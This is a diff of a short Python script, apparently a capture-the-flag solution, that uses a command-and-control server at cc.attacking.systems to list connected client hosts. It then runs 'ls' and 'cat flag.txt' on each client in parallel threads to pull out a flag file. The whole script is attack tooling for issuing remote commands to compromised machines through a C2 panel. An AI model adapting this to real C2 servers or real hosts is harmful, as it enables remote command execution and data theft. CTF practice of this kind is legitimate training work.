@@ -1,30 +1,24 @@
 import requests
 import threading
 
-clientListingURL = "https://cc.attacking.systems/?command=list"
-
-def getClientIPs():
-    r = requests.get(clientListingURL)
-    return r.text.split("\n")
+serverCommandURL = "https://cc.attacking.systems/?command="
 
 def sendCommand(command):
-    r = requests.get("https://cc.attacking.systems/?command="+command)
-    return r.text
+    return requests.get(serverCommandURL+command).text
 
-def sendCommandThread(clientIP):
-    res = sendCommand("run " + clientIP + " ls")
-    if res.__contains__("flag"):
-        print("Found CYSEC flag file on host " + clientIP)
-        res = sendCommand("run " + clientIP + " cat flag.txt")
-        print("flag: " + res)
+def checkForFlag(clientIP):
+    # List files on client and check if a file called flag is found
+    if sendCommand("run " + clientIP + " ls").__contains__("flag"):
+        # If flag is found, print the flag by reading the file content with cat
+        print("Found flag on host " + clientIP + ".\nflag: " + sendCommand("run " + clientIP + " cat flag.txt"))
 
 def main():
-    clientIPs = getClientIPs()
+    clientIPs = sendCommand("list").split("\n")
 
-    # Send commands to all clients by using a separate thread for each client for improving performance due to rapidly changing client ips
+    # Start unique thread for each client in clientIPs for faster execution
     threads = []
     for clientIP in clientIPs:
-        thread = threading.Thread(target=sendCommandThread, args=(clientIP,))
+        thread = threading.Thread(target=checkForFlag, args=(clientIP,))
         threads.append(thread)
         thread.start()
     for thread in threads:
